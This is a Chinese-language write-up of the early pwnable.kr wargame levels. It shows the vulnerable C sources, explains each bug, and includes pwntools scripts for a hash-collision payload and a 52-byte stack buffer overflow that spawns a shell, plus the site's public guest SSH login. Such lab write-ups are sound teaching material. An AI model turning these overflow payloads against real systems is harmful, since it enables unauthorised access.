# pwnable解题记录

[https://pwnable.kr](https://pwnable.kr)

[TOC]

## fd

知识点：

- 文件描述符fd，值及含义：
  - `0`——标准输入
  - `1`——标准输出
  - `2`——标准错误输出

`fd.c`文件如下：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}
```

可控参数`argv[1]`，第13行`if`条件需要`buf`值为`LETMEWIN\n`，所以需要在第10行使`fd = atoi( argv[1] ) - 0x1234 = 0`，如此便可在第12行向`buf`中输入内容`LETMEWIN\n`得到flag。![](./images/fd.jpg)

## collision

`col.c`文件如下：

```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
        int* ip = (int*)p;
        int i;
        int res=0;
        for(i=0; i<5; i++){
                res += ip[i];
        }
        return res;
}

int main(int argc, char* argv[]){
        if(argc<2){
                printf("usage : %s [passcode]\n", argv[0]);
                return 0;
        }
        if(strlen(argv[1]) != 20){
                printf("passcode length should be 20 bytes\n");
                return 0;
        }

        if(hashcode == check_password( argv[1] )){
                system("/bin/cat flag");
                return 0;
        }
        else
                printf("wrong passcode.\n");
        return 0;
}
```

需要传入一个20字节的参数`argv[1]`，然后该参数被强制转换为长度为5的整形数组（刚好一个整型4字节），数组5个元素之和要等于`0x21DD09EC`，即可获得flag。传参时注意使用小端序即可，脚本如下：

```python
#!/usr/bin/python
#coding:utf-8
from pwn import *

if __name__ == '__main__':
    #context(log_level='debug')
    s = ssh(host="pwnable.kr", user="col", password="guest", port=2222)
    payload = '\xc8\xce\xc5\x06' * 4 + '\xcc\xce\xc5\x06'
    p = s.process(argv=['./col', payload])
    print p.recv()
```

![](./images/col.jpg)

## bof

`bof.c`文件如下：

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

`func`函数要求传入参数`key=0xcafebabe`才能返回shell，但`main`函数中调用`func`时传的参数值并不符合要求。所以我们要通过`func`函数中的输入点来进行缓冲区溢出（buffer over flow/bof），将`key`的值覆盖为我们想要的值`0xcafebabe`。

首先使用`gdb`进行调试：

可以在`func`函数处下断点，运行至`func`函数后单步执行到其中的输入点`gets`函数处：

![](./images/bof_1.jpg)

在执行`gets`函数前，我们先生成一段探针

![](./images/bof_0.jpg)

然后在输入点传入这段探针：
![](./images/bof_2.jpg)

可以看到`gets`函数之后就是`cmp`

![](./images/bof_3.jpg)

地址`ebp+0x8`里的内容和`0xcafebabe`进行比较，然后跳转，这里也就对应`bof.c`中`func`函数的`if`条件句。

此时我们查看地址`ebp+0x8`中的内容：

![](./images/bof_4.jpg)

`0x41474141`即`AGAA`，注意端序，实际应该是`AAGA`。由此我们计算出偏移值为52，如上图。

接下来就可以写脚本了。

```python
#!/usr/bin/python
#coding:utf-8
from pwn import *

if __name__ == '__main__':
    context(log_level='debug')

    p = remote("pwnable.kr", 9000)
    payload = 'A' * 52 + p32(0xcafebabe)  # 偏移值之后接上我们需要覆写的内容
    p.sendline(payload)
    p.interactive()
```

![](./images/bof_5.jpg)

## flag

没有源码，依题目所说，这是个简单的逆向，`gdb`调试就能搞定。

下载文件后，直接`gdb`调试出现了点问题，后来发现是`upx`加壳程序，`upx -d flag`脱壳后就可以正常调试了。

在`main`函数中单步调试，在`malloc`之后两条指令，就可以看到，flag串地址被送到了寄存器`rdx`中，顺便也就看到了flag内容。

![](./images/flag.jpg)

